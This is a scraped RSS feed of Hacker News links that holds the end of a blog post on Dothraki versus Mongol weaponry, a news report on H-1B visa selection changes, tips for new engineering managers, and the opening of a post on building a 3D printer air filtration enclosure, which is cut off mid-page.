<p>We might dismiss this as simply an accident of Daenerys’ perspective – that, being Westerosi, she focuses on the weapon most meaningful to the Westerosi – but that’s clearly not true.  After all, the <strong>offering of an <em>arakh</em> is how Daenerys’ loyal followers demonstrate their fealty to her</strong>, in a ceremony that is clearly Dothraki, not Westerosi (<em>AGoT</em>, 674).  It is also, I should note,<a href="https://awoiaf.westeros.org/index.php/Arakh"> the only weapon we see <em>non</em>-Dothraki using that is clearly identified as being foreign and typical of the Dothraki</a>.  It remains special through the eyes of multiple point-of-view characters, including military men.</p>



<p>(And, as an aside, now that we are this far in, it seems obvious but worth saying that the fact that Martin has no Dothraki viewpoint characters in his narrative is hardly a saving grace; it merely intensifies the ‘view of a savage culture from outside’ effect.  As we’ll see, this makes perfect sense given what seem to be the actual inspirations for his depiction.)</p>



<p><strong>The prominence of a curved iron (or steel) sword lets us rule out a Great Plains Native American inspiration for this kit right out</strong>; the sword was never a significant part of Plains Native American armament (the lack of tool-metal production in the Americas prior to European contact means that there was no indigenous sword-making tradition, although the <a href="https://en.wikipedia.org/wiki/Macuahuitl"><em>maquahuitl</em> </a>represents a clever sort of ‘sharpened club’ design).  Even after contact, it’s hard to avoid the conclusion that the expense of trading for a sword wouldn’t have been justified by its utility over a steel axe which might also double as a tool (on axes, see W. Lee, “The Military Revolution of Native North America: Firearms, Forts and Politics” in <em>Empires and Indigenes</em> (2011), 62-3).  <strong>So we must turn to the Eurasian Steppe</strong>.</p>



<p><strong>And immediately we run into problems</strong>, not that any of these weapons are <em>wrong</em> per se, but <strong>that their proportion and prominence is all mixed up and that there are other, far more important weapons missing.</strong></p>



<p><strong>For a Steppe nomad, by far, above and away, the most important weapon was the bow.</strong>  The Armenians literally called the Mongols “the nation of archers” (May, <em>Mongol Art of War</em>, 43).  Nomads spent the most time learning the bow (May, <em>op. cit.</em> 42-49) and it was the one indispensable weapon.  Indeed, so indispensable that nomads were generally required to have several; the <em>Liao Shi</em> records that Khitan nomad warriors were required to possess four bows and 400 arrows, while John de Plano Carpini reports that the Mongols all needed to have 2-3 bows and three larger quivers (May, <em>op. cit. </em>49-50).  <strong>The Steppe bow itself would also have looked unusual in both shape and construction</strong> to a Westerosi observer either strung or unstrung – they were composite bows, made with a wood core, a backing of horn and a rigid end-piece (called a <em>siyah</em> in Arabic) and were generally drawn with the use of a thumb-ring to reduce strain on the thumb (May, <em>op. cit.</em>, 50-1).  This unique construction allowed these bows to reach draw weights and launch energies equivalent to the far larger yew longbows of England and Wales and still be compact enough to use from horseback.</p>



<div><figure><img data-attachment-id="5819" data-permalink="https://acoup.blog/ilkhanidhorsearcher-2/" data-orig-file="https://acoupdotblog.files.wordpress.com/2021/01/ilkhanidhorsearcher.jpg" data-orig-size="450,350" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="ilkhanidhorsearcher" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2021/01/ilkhanidhorsearcher.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2021/01/ilkhanidhorsearcher.jpg?w=450" src="https://acoupdotblog.files.wordpress.com/2021/01/ilkhanidhorsearcher.jpg?w=450" alt="" srcset="https://acoupdotblog.files.wordpress.com/2021/01/ilkhanidhorsearcher.jpg 450w, https://acoupdotblog.files.wordpress.com/2021/01/ilkhanidhorsearcher.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2021/01/ilkhanidhorsearcher.jpg?w=300 300w" sizes="(max-width: 450px) 100vw, 450px"><figcaption><a href="https://en.wikipedia.org/wiki/Mongols#/media/File:IlkhanidHorseArcher.jpg">Via Wikipedia</a>, a 13th century Mongol horse archer.  Lightly armored, he carries a bow (and a fancy hat) but no sword.</figcaption></figure></div>



<p>(I should note that the bow was <em>also</em> the paramount weapon for the Native American horse-borne nomads of the Great Plains, at least until it came into competition with firearms, though my understanding is that Native American bows were not as powerful as Steppe bows).</p>



<div><figure><img loading="lazy" data-attachment-id="5821" data-permalink="https://acoup.blog/minolta-dsc/" data-orig-file="https://acoupdotblog.files.wordpress.com/2021/01/naadam_women_archery.jpg" data-orig-size="1920,2560" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;3.2&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;DiMAGE A1&quot;,&quot;caption&quot;:&quot;Minolta DSC&quot;,&quot;created_timestamp&quot;:&quot;1118415959&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;12.91796875&quot;,&quot;iso&quot;:&quot;100&quot;,&quot;shutter_speed&quot;:&quot;0.0003125&quot;,&quot;title&quot;:&quot;Minolta DSC&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="Minolta DSC" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2021/01/naadam_women_archery.jpg?w=225" data-large-file="https://acoupdotblog.files.wordpress.com/2021/01/naadam_women_archery.jpg?w=768" src="https://acoupdotblog.files.wordpress.com/2021/01/naadam_women_archery.jpg?w=768" alt="" width="596" height="795" srcset="https://acoupdotblog.files.wordpress.com/2021/01/naadam_women_archery.jpg?w=768 768w, https://acoupdotblog.files.wordpress.com/2021/01/naadam_women_archery.jpg?w=596 596w, https://acoupdotblog.files.wordpress.com/2021/01/naadam_women_archery.jpg?w=1192 1192w, https://acoupdotblog.files.wordpress.com/2021/01/naadam_women_archery.jpg?w=113 113w, https://acoupdotblog.files.wordpress.com/2021/01/naadam_women_archery.jpg?w=225 225w" sizes="(max-width: 596px) 100vw, 596px"><figcaption><a href="https://en.wikipedia.org/wiki/Mongols#/media/File:Naadam_women_archery.jpg">Via Wikipedia</a>, a modern Mongolian woman taking part in an archery contest.  You can see here the unique shape and multi-part construction of the Steppe bow (notice how the material on the tips, the belly and the spine of the bow are all different) which allows it so much power in such a small frame.<br>Also, notice the very nice and colorful traditional Mongolian clothing – not leather and rough furs!</figcaption></figure></div>



<p><strong>But even after the bow, the sword is not first.  Or even close to first.</strong>  Or, indeed, <em>even on the list</em>!  The Khitan regulations I mentioned included four bows, two spears (one ‘long’ and one ‘short’), a club, an axe and a halberd, but no sword.  John de Plano Carpini describes the full kit as two or three bows with quivers, an axe, ropes, and swords <em>only for the wealthy</em> (May. <em>op. cit.</em>, 50).  Speaking more broadly, May notes that spears (used as lances from horseback) seem universal in accounts of the Mongols, but “accounts are contradictory regarding whether these [swords] were universally used” (May, <em>op. cit.</em>, 52).  While May supposes that the <em>ughurgh-a</em>, the Mongolian lasso, might have been used in combat – and it may well have – we have no definitive evidence of it.  If it was ever a weapon, it doesn’t seem to have been an important one.</p>



<p><strong>In short, while the Dothraki’s weapons are an <em>arakh</em>-sword, a whip, and a bow in that order, the Mongol’s chief weapons were his bow, followed by his backup bow, followed by his <em>other </em>backup bow, followed by his spear, and then his axe and only then followed by a sword, should he have one, which he might well not</strong>.  The reason for preferring an axe or a spear for the humble nomad should not be too surprising – iron in quantity could be hard to get on the Steppe.  Spears and axes are not only weapons, but also useful hunting and survival tools; swords are generally weapons only.  <a href="https://acoup.blog/2020/09/18/collections-iron-how-did-they-make-it-part-i-mining/">Nomads generally cannot do their own metal working</a>, so swords would have to be imported.  Moreover, even in a melee, the first recourse would be to a spear, <a href="https://acoup.blog/2020/05/08/collections-the-battle-of-helms-deep-part-ii-total-warg/">whose reach on horseback was a huge advantage</a>,<strong> making a sword an expensive imported foreign luxury <em>backup</em> weapon with no additional utility</strong>.  Nevertheless, it’s clear that Steppe nomads, once successful and moving into agrarian areas, liked to acquire swords – swords are effective weapons! – but the sword was about the furthest thing from the core of Mongol culture the way the <em>arakh</em> is practically the <em>symbol</em> of Dothraki culture.</p>



<figure><img data-attachment-id="5816" data-permalink="https://acoup.blog/langshiming_mao/" data-orig-file="https://acoupdotblog.files.wordpress.com/2021/01/langshiming_mao.jpg" data-orig-size="1920,1118" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="langshiming_mao" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2021/01/langshiming_mao.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2021/01/langshiming_mao.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2021/01/langshiming_mao.jpg?w=1024" alt="" srcset="https://acoupdotblog.files.wordpress.com/2021/01/langshiming_mao.jpg?w=1024 1024w, https://acoupdotblog.files.wordpress.com/2021/01/langshiming_mao.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2021/01/langshiming_mao.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2021/01/langshiming_mao.jpg?w=768 768w, https://acoupdotblog.files.wordpress.com/2021/01/langshiming_mao.jpg 1920w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption><a href="https://en.wikipedia.org/wiki/Mongols#/media/File:Langshiming_mao.JPG">Via Wikipedia</a>, a relatively late Mongol soldier (c. 1755) nevertheless shows nearly the full kit, including mail body defense, a long spear for use on horseback, arrows (the bow in its bow-case would have been on the other side) and, this being the 1700s, a musket.</figcaption></figure>



<p><strong>The other issue, of course, is the <em>arakh</em> itself.</strong>  Martin describes the weapons as “long razor-sharp blades, half sword and half scythe” (<em>AGoT</em>, 85) and goes back to that scythe analogy (e.g. <em>ASoS</em>, 245).  It seems generally asserted that what Martin means by this is something close to a scimitar (I have to confess, I haven’t found anywhere that Martin says …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acoup.blog/2021/01/08/collections-that-dothraki-horde-part-iv-screamers-and-howlers/">https://acoup.blog/2021/01/08/collections-that-dothraki-horde-part-iv-screamers-and-howlers/</a></em></p>]]>
            </description>
            <link>https://acoup.blog/2021/01/08/collections-that-dothraki-horde-part-iv-screamers-and-howlers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25682359</guid>
            <pubDate>Fri, 08 Jan 2021 07:10:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[US to modify H1B visa selection process – wages, skill level to get priority]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25682309">thread link</a>) | @LopRabbit
<br/>
January 7, 2021 | https://www.businessinsider.in/international/news/us-to-modify-h1b-visa-selection-process-wages-skill-level-to-get-priority-over-lottery-system/articleshow/80164510.cms | <a href="https://web.archive.org/web/*/https://www.businessinsider.in/international/news/us-to-modify-h1b-visa-selection-process-wages-skill-level-to-get-priority-over-lottery-system/articleshow/80164510.cms">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id="datatxt80164510read"><div data-den="denmark"><div><p>The United States on Thursday announced that it will modify the selection process for H-1B visa, giving priority to salary and skills instead of the current lottery procedures. 
</p><p>
 The final rule to be published in the federal register on January 8, officials said, is aimed to protect the economic interests of US workers and better ensure the most highly skilled foreign workers benefit from the temporary employment programme. 
</p><p>
     The H-1B visa is a non-immigrant visa that allows US companies to employ foreign workers in specialty occupations that require theoretical or technical expertise. The technology companies depend on it to hire tens of thousands of employees each year from countries like India and China. 
</p><p> Modifying the H-1B cap selection process will incentivise employers to offer higher salaries, and/or petition for higher-skilled positions, and establish a more certain path for businesses to achieve personnel needs and remain globally competitive, said </p><keyword keytype="Company" smid="0" usetype="2" keywordseo="US-Citizenship-and-Immigration-Services" actualkeyword="US Citizenship and Immigration Services">US Citizenship and Immigration Services</keyword><p>. 
</p><p>
     The final rule will be effective 60 days after its publication in the Federal Register. The next H-1B visa filing season is slated to start on April 1. 
</p><p>
 "The H-1B temporary visa programme has been exploited and abused by employers primarily seeking to fill entry-level positions and reduce overall business costs," said </p><keyword keytype="Company" smid="0" usetype="2" keywordseo="USCIS" actualkeyword="USCIS">USCIS</keyword><p> Deputy Director for Policy Joseph Edlow. 
</p><p><span>Advertisement</span></p><figure><div></div></figure><hr><p> "The current H-1B random selection process makes it difficult for businesses to plan their hiring, fails to leverage the programme to compete for the best and brightest international workforce, and has predominantly resulted in the annual influx of foreign labor placed in low-wage positions at the expense of US workers," he said. 
</p><p>
 This effort will only affect H-1B registrations (or petitions, if the registration process is suspended) submitted by prospective petitioners seeking to file H-1B cap-subject petitions. 
</p><p>
     It will be implemented for both the H-1B regular cap and the H-1B advanced degree exemption, but it will not change the order of selection between the two as established by the H-1B registration final rule, USCIS said. 
</p><p> The </p><keyword keytype="Company" smid="0" usetype="2" keywordseo="Department-of-Homeland-Security" keynameseo="department-of-homeland-security" actualkeyword="department of homeland security">Department of Homeland Security</keyword><p> had previously published a notice of proposed rulemaking on November 2, 2020. It carefully considered the public comments received before deciding to publish the proposed regulations as a final rule, USCIS said. 
</p><p>
     According to the final rule, a version of which was released by Department of Homeland Security, Instead, a registration system that faithfully implements the Immigration and Nationality Act (INA) while prioritising registrations based on wage level within each cap will incentivize H-1B employers to offer higher wages, or to petition for positions requiring higher skills and higher-skilled aliens that are commensurate with higher wage levels, to increase the likelihood of selection and eligibility to file an H-1B cap-subject petition. 
</p><p>
 Moreover, it will maximize H-1B cap allocations, so that they more likely will go to the best and brightest workers; and it will disincentivise abuse of the H-1B programme to fill relatively lower-paid, lower-skilled positions, which is a significant problem under the present selection system, it said. 
</p><p> "While administering a random lottery system is reasonable, it is inconsiderate of Congress's statutory purposes for the H-1B program and its administration," said the final rule. 
</p><p>
 The changes in this final rule will apply to all registrations, including those for the advanced degree exemption, submitted on or after the effective date of the final rule. 
</p><p>
     As per Congressional-mandated cap, USCIS in one year can issue a maximum of 65,000 H-1B visas. It can also issue another 20,000 H-1B visas to those foreign students who have completed higher studies from a US university in STEM subjects. 
</p><p> During the public notice period, the department said, several commenters expressed support for the rule and the need to stop visa fraud, abuse, and flooding of petitions by certain staffing or consulting companies. 
</p><p>
     One commenter said the proposed rule would disincentivize companies from abusing the H-1B programme and harming US workers. Other commenters said the proposed rule would decrease potential visa abuse by employers and make sure all workers were paid according to their skillset as employers no longer would be able to lower labor expenses by hiring foreign workers. 
</p><p>
 Another said that the proposed rule would have a positive impact on US employees and college educated US citizens who take out loans for their education by making it harder for technology companies to discriminate against US citizens; US workers are being laid off in large numbers because corporations are outsourcing for profits; and the proposed rule is necessary because Indian corporations are acquiring US jobs, it said. 
</p>
<p><strong>SEE ALSO: <a href="https://www.businessinsider.in/stock-market/news/tcs-ongc-tata-power-punjab-national-bank-nhpc-and-other-top-stocks-to-watch/articleshow/80164057.cms">TCS’ market share, ONGC’s borrowing, Tata Power gets new territories⁠— these and other top stocks to watch</a></strong>
<a href="https://www.businessinsider.in/tech/news/whatsapp-is-forcing-users-to-share-personal-data-with-facebook-and-elon-musk-is-urging-people-to-switch-to-signal-a-smaller-encrypted-messaging-app/articleshow/80156317.cms">WhatsApp is forcing users to share personal data with Facebook, and Elon Musk is urging people to switch to Signal, a smaller encrypted messaging app</a>
<br>
</p></div></div></div></div></div>]]>
            </description>
            <link>https://www.businessinsider.in/international/news/us-to-modify-h1b-visa-selection-process-wages-skill-level-to-get-priority-over-lottery-system/articleshow/80164510.cms</link>
            <guid isPermaLink="false">hacker-news-small-sites-25682309</guid>
            <pubDate>Fri, 08 Jan 2021 07:02:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tips for a New Engineering Manager]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25681979">thread link</a>) | @alexhunterlang
<br/>
January 7, 2021 | https://n2infinityandbeyond.com/2021/01/07/tips-for-a-new-engineering-manager/ | <a href="https://web.archive.org/web/*/https://n2infinityandbeyond.com/2021/01/07/tips-for-a-new-engineering-manager/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Welcome to the new world of engineering management! You’ve entered a brave new world that will be significantly different than your life as an individual contributor. Here are some tips I’ve learned over time.</p>



<p>You have one goal: <strong>maximize your team’s productive work</strong>.</p>



<p>That’s it. Do that and you will succeed. Do anything else and you fail. Life is simple.</p>



<p>Let’s break that down into a few key ideas.</p>



<h2>Maximize Your Team Member’s Potential</h2>



<p>First, let’s assess the type of engineers you may have on your team.</p>



<ul><li><strong>Solid</strong> = Can solve well defined problems.</li><li><strong>Bad</strong> = Can’t solve well defined problems.</li><li><strong>Junior</strong> = Bad engineers but have the excuse of being very early in their career or being put into a new situation.</li><li><strong>Leaders</strong> = Can determine the problems that need to be solved and help others get the necessary work done.</li></ul>



<p>How should you manage the different types of engineers?</p>



<p><strong>Engineering Leaders</strong>. If you are a new manager, you are likely the only Leader in your team. If you are lucky enough to have team members that are Leaders, your life will be easy. Just keep giving them tough problems and stay out of their way.</p>



<p><strong>Solid Engineers</strong>. These engineers will hopefully make up most of your team. They can tackle well defined problems, so to maximize their current utility, work on giving them the minimum definition they need and then get out of their way. To maximize their long term success, you want to try and turn Solid Engineers into Leaders. One way to do this is to keep giving them tougher problems with less definition and let them grow into Leaders.</p>



<p><strong>Bad Engineers. </strong>Hopefully you don’t inherit any Bad Engineers. If you do, you need to quickly assess whether it is worth the management effort to get them to Solid Engineers, or get them off your team (either by firing or a transfer to another team).</p>



<p><strong>Junior Engineers. </strong>As a new manager, you are likely to have several Junior Engineers. I’ve found that everyone is happiest if both the Junior Engineer and yourself acknowledge that Junior Engineers do not produce useful work today. Instead, both the Junior Engineer and yourself should focus your efforts on turning them into a Solid Engineer as soon as possible. As a manager, you can accelerate their growth by (1) giving them training tasks, i.e. tasks that may not be the most relevant to your team’s productivity today, but help them grow as an individual and (2) giving them extra 1 on 1 attention. While this extra effort will consume significant time now, you can have a Solid Engineer within a few months. Plus, this extra effort is nothing compared to the effort you would later need to spend to move someone from a Bad Engineer to Solid Engineer.</p>



<h2>Maximize Your Team Output</h2>



<p>Now that we have covered the basics of maximizing individual team member’s performance, let’s move on to some tips for maximizing your whole team’s output.</p>



<h3>Your Output</h3>



<p>First, you need to plan that your personal coding output will basically be zero. You may occasionally do some coding, but you need to remember that you are judged on your team’s output now, not just your own. So any coding project you do needs to be weighed against the opportunity cost of you spending that same amount of time improving your team members. I’ve found that this likely means you will only end up coding (1) early prototypes, (2) refactorings, or (3) nice to have projects. Instead, you need to switch to thinking about your team’s output.</p>



<h3>Meetings</h3>



<p>As a new manager, your life can easily be consumed by meetings. You will now be in charge of 1:1s and team meetings, and also get invited to lots of cross team meetings. My biggest regret as an early manager is saying yes to every meeting. I personally am fine with delegating work, but my weakness was that I still wanted to know everything that was going on. Before you know it, you will spend all day running from meeting to meeting. This is bad for three reasons: (1) you don’t have time to think, (2) you can’t adapt to emergencies and (3) your team members will become too shy to schedule 1:1s with you since they assume you are doing something important.&nbsp;&nbsp;</p>



<p>So fight the good fight and minimize the number of meetings. I advocate the following meeting philosophy:</p>



<ul><li>All meetings should have a predefined agenda, even 1:1s.</li><li>Have the minimum number of people in the meeting (ie prefer 1:1s or small groups)</li><li>Minimize the number of meetings that are just status updates. Most of these can likely be replaced by email, Slack, or a document.</li><li>Group meetings into blocks. I’ve had success with the following type of meeting schedule:<ul><li>Monday AM: Sprint starts / big team meetings.</li><li>Monday PM: 1:1s.</li><li>Tuesday: No recurring meetings.</li><li>Wednesday: Cross team meetings.</li><li>Thursday: No recurring meetings.</li><li>Friday AM: Sprint check ins / sprint end meetings.</li><li>Friday PM: 1:1s.</li></ul></li></ul>



<h3>Documents</h3>



<p>A well written document is one of your two new best friends. The power of a well written document is that it (1) forces you to clarify your thoughts, (2) provides a clear documentation trail and (3) prevents you from repeating yourself. There is nothing worse than having a meeting with a lot of people that leads to some very important decisions, but then no one can seem to remember what those decisions are. Write, write, and write some more.&nbsp;</p>



<h2>Do Productive Work</h2>



<p>At this point your team should be doing lots of work. But how do you guarantee that this work is productive? Let me introduce you to your second new best friend: <a href="https://www.whatmatters.com/get-started/">Objectives and Key Results</a>.&nbsp;</p>



<p>The main principles of OKRs are:</p>



<ul><li>Objectives should be clearly defined aspirational goals</li><li>Key results are specific quantitative measures</li><li>Each objective should be supported by 3-5 key results</li><li>Ideally key results can be measured on a 0-100% scale</li><li>To make key results push the boundaries of your team, it is recommended that<ul><li>A key result is considered achieved if &gt;=70% is achieved</li><li>Key results are not tied to pay</li></ul></li></ul>



<p>Many companies use a mix of yearly and quarterly OKRs. I personally find the quarter OKRs most useful as a management tool. The yearly OKRs are more useful for upper management to set clear company wide goals, but I’ve found that setting yearly team goals are not very useful unless they directly tie into a company OKR. Instead, I would focus on writing solid quarterly team OKRs.</p>



<p>For OKRs to truly work, you need to get buy in from the whole team. In order to get buy in, you should:</p>



<ol><li>Do the necessary prep work to deeply understand the company priorities and OKRs.</li><li>Involve your team members in developing the team OKRs.</li><li>Set up a central dashboard to track your progress on OKRs.</li><li>Make that dashboard a central part of your meetings. Kick off team meetings by looking at the dashboard and calling out progress.</li><li>Have a retrospective at the end of the recording period to understand why your team succeeded or failed to achieve OKRs.</li><li>Rinse and repeat. Your first several quarters of OKRs likely won’t go well. But please don’t give up until you have tried for at least 4 quarters in a row.</li></ol>



<h2>Final Thoughts</h2>



<p>Good luck, hope these tips help!</p>
			
			
						</div></div>]]>
            </description>
            <link>https://n2infinityandbeyond.com/2021/01/07/tips-for-a-new-engineering-manager/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25681979</guid>
            <pubDate>Fri, 08 Jan 2021 06:02:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building an Air Filtration System for a 3D Printer]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25680448">thread link</a>) | @michaeltbuss
<br/>
January 7, 2021 | https://mikebuss.com/2021/01/06/3d-printer-filtration/ | <a href="https://web.archive.org/web/*/https://mikebuss.com/2021/01/06/3d-printer-filtration/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div class="page">
  
  
    <p>How I used a microcontroller, a fan, and a bunch of sensors to create a smart filtration system.</p>
  

  <p>January 06, 2021 | <a href="https://mikebuss.com/">Mike Buss</a></p>
</div><div class="page">
  
<figure>

    <a href="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/enclosure1.jpg">

<picture>
    
    <source data-srcset="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/enclosure1.webp" type="image/webp">
    
    <img data-src="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/enclosure1.jpg" alt="" data-srcset="    /assets/resized/enclosure1-480x325.jpg 480w,    /assets/resized/enclosure1-960x650.jpg 960w,    /assets/resized/enclosure1-1200x812.jpg 1200w,/assets/images/posts/3d-printer-filtration/enclosure1.jpg 2000w" src="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/enclosure1.jpg" srcset="    https://mikebuss.com/assets/resized/enclosure1-480x325.jpg 480w,    https://mikebuss.com/assets/resized/enclosure1-960x650.jpg 960w,    https://mikebuss.com/assets/resized/enclosure1-1200x812.jpg 1200w,https://mikebuss.com/assets/images/posts/3d-printer-filtration/enclosure1.jpg 2000w">
</picture>
</a>


</figure>

<p>I was thinking of projects to work on, and I thought, gee, it would be nice if our 3D printer didn’t kill us <a href="#risks-footnote"><sup>1</sup></a>.</p>

<p>I had researched the potential health side effects of owning a 3D printer when I bought it - it turns out they can malfunction and catch fire or release <a href="https://en.wikipedia.org/wiki/Volatile_organic_compound">harmful chemicals</a> into the air - but I made excuses. I’m only printing in <a href="https://en.wikipedia.org/wiki/Polylactic_acid">Polyactic Acid</a> (PLA), one of the least harmful filaments - it’s probably fine. Sure, maybe it releases some tiny plastic into the air, but it’s a big room, and sometimes I keep the windows open. Our smoke detectors are brand new and well tested. We’re <em>probably fine</em>.</p>

<p>Now that we welcomed <a href="https://mikebuss.com/2020/10/08/welcome-theodore/">Theodore</a>, our now 3-month-old, into the world, I wanted to be on the safe side. So, I set out to build an air filtration system and some other safety features.</p>

<hr>

<h2 id="the-start-of-an-idea">The Start of an Idea</h2>

<p>As with most of my hobby projects, it started out simple. I thought of strapping a fan to a HEPA filter and maybe adding a carbon filter for extra protection. Then I thought: wouldn’t it be cool if it turned on and off automatically when a print started? Surely that wouldn’t be too difficult to build.</p>

<p>And wouldn’t it be even better if the system could tell when the volatile organic compounds (VOC) levels were high and adjust the fan speed accordingly? Since the goal is to make this box less likely to kill everyone in our sleep, why not add a fire sensor and an electric cutoff?</p>

<figure>

    <a href="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/fan2.jpg">

<picture>
    
    <source data-srcset="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/fan2.webp" type="image/webp">
    
    <img data-src="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/fan2.jpg" alt="" data-srcset="    /assets/resized/fan2-480x360.jpg 480w,    /assets/resized/fan2-960x720.jpg 960w,    /assets/resized/fan2-1200x900.jpg 1200w,/assets/images/posts/3d-printer-filtration/fan2.jpg 2000w" src="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/fan2.jpg" srcset="    https://mikebuss.com/assets/resized/fan2-480x360.jpg 480w,    https://mikebuss.com/assets/resized/fan2-960x720.jpg 960w,    https://mikebuss.com/assets/resized/fan2-1200x900.jpg 1200w,https://mikebuss.com/assets/images/posts/3d-printer-filtration/fan2.jpg 2000w">
</picture>
</a>


<figcaption>The fan I started with: a 140mm NZXT fan for PC's.</figcaption>

</figure>

<p>Eventually, I landed on building a totally ridiculous, completely overkill air filtration system for our 3D printer that probably wasn’t necessary in the first place. And it was lots of fun.</p>

<p>Here’s how I did it.</p>

<hr>

<h2 id="sketching-it-out">Sketching It Out</h2>

<p>I’m a firm believer in “measure twice, cut once”, so I started with a sketch of the system. I measured my 3D printer - an <a href="https://ultimaker.com/3d-printers/ultimaker-s3">Ultimaker S3</a> - and jotted down a plan for the top enclosure. Then, I sketched out what components I wanted to use and how they’d connect.</p>

<figure>

    <a href="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/sketches.png">

<picture>
    
    <source data-srcset="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/sketches.webp" type="image/webp">
    
    <img data-src="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/sketches.png" alt="" data-srcset="    /assets/resized/sketches-480x240.png 480w,    /assets/resized/sketches-960x480.png 960w,    /assets/resized/sketches-1200x600.png 1200w,/assets/images/posts/3d-printer-filtration/sketches.png 2000w" src="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/sketches.png" srcset="    https://mikebuss.com/assets/resized/sketches-480x240.png 480w,    https://mikebuss.com/assets/resized/sketches-960x480.png 960w,    https://mikebuss.com/assets/resized/sketches-1200x600.png 1200w,https://mikebuss.com/assets/images/posts/3d-printer-filtration/sketches.png 2000w">
</picture>
</a>


<figcaption>The final product has changed since these sketches.</figcaption>

</figure>

<p>Next, I printed the parts I needed to assemble the box and the filtration panel. Isn’t it cool how a printer can print things to augment itself? Next step: <a href="https://en.wikipedia.org/wiki/Skynet_(Terminator)">Skynet</a>.</p>

<figure>

    <a href="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/printing.png">

<picture>
    
    <source data-srcset="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/printing.webp" type="image/webp">
    
    <img data-src="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/printing.png" alt="" data-srcset="    /assets/resized/printing-480x269.png 480w,    /assets/resized/printing-960x539.png 960w,    /assets/resized/printing-1200x674.png 1200w,    /assets/resized/printing-2000x1123.png 2000w,/assets/images/posts/3d-printer-filtration/printing.png 2494w" src="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/printing.png" srcset="    https://mikebuss.com/assets/resized/printing-480x269.png 480w,    https://mikebuss.com/assets/resized/printing-960x539.png 960w,    https://mikebuss.com/assets/resized/printing-1200x674.png 1200w,    https://mikebuss.com/assets/resized/printing-2000x1123.png 2000w,https://mikebuss.com/assets/images/posts/3d-printer-filtration/printing.png 2494w">
</picture>
</a>


<figcaption>Everything except the electronics and Lexan was printed.</figcaption>

</figure>

<hr>

<h2 id="building-the-partial-enclosure">Building the Partial Enclosure</h2>

<p>I bought some Lexan from Home Depot, scored the sheets with a box cutter, and snapped them off using the edge of my workbench. It worked surprisingly well.</p>

<p>If you plan to do this at home, <em>wear protective gear</em>, including glasses.</p>

<figure>

    <a href="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/lexan1.jpg">

<picture>
    
    <source data-srcset="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/lexan1.webp" type="image/webp">
    
